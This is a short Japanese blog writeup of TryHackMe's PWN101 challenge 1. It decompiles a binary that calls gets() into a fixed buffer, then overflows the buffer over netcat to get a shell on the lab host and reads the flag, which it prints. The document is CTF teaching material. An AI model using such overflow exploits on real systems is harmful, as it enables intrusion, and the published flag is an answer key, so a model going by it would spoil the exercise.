---
title: TryHackMe PWN101 Writeup (1) PWN101
pubDatetime: 2026-04-25T01:00:00+09:00
description: TryHackMe PWN101 Challenge 1のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

```shellsession
$ file pwn101-1644307211706.pwn101
pwn101-1644307211706.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
```

## checksec

```shellsession
$ .venv/bin/pwn checksec pwn101-1644307211706.pwn101
[*] '/home/hat0uma/work/pwn101-1644307211706.pwn101'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## 実行

ビリヤニの材料教えてほしいらしい。

```shellsession
./pwn101-1644307211706.pwn101
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani:

Nah bruh, you lied me :(
She did Tomato rice instead of briyani :/
```

## Ghidra

バッファオーバーフローさせればいいだけ

```c
void main(void)
{
  char local_48 [60];
  int local_c;

  local_c = 0x539;
  setup();
  banner();
  puts(
      "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D\n"
      );
  puts("Type the required ingredients to make briyani: ");
  gets(local_48);
  if (local_c == 0x539) {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
                    /* WARNING: Subroutine does not return */
    exit(0x539);
  }
  puts("Thanks, Here\'s a small gift for you <3");
  system("/bin/sh");
  return;
}
```

## solver

```shellsession
root@ip-10-144-107-4:~# nc 10.144.129.186 9001
       \u250c\u252c\u2510\u252c\u2500\u2510\u252c \u252c\u252c \u252c\u250c\u2500\u2510\u250c\u2500\u2510\u252c\u250c\u2500\u250c\u252c\u2510\u250c\u2500\u2510
        \u2502 \u251c\u252c\u2518\u2514\u252c\u2518\u251c\u2500\u2524\u251c\u2500\u2524\u2502  \u251c\u2534\u2510\u2502\u2502\u2502\u251c\u2524
        \u2534 \u2534\u2514\u2500 \u2534 \u2534 \u2534\u2534 \u2534\u2514\u2500\u2518\u2534 \u2534\u2534 \u2534\u2514\u2500\u2518
                 pwn 101

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Thanks, Here's a small gift for you <3
ls
flag.txt
pwn101
pwn101.c
cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}
^C
```
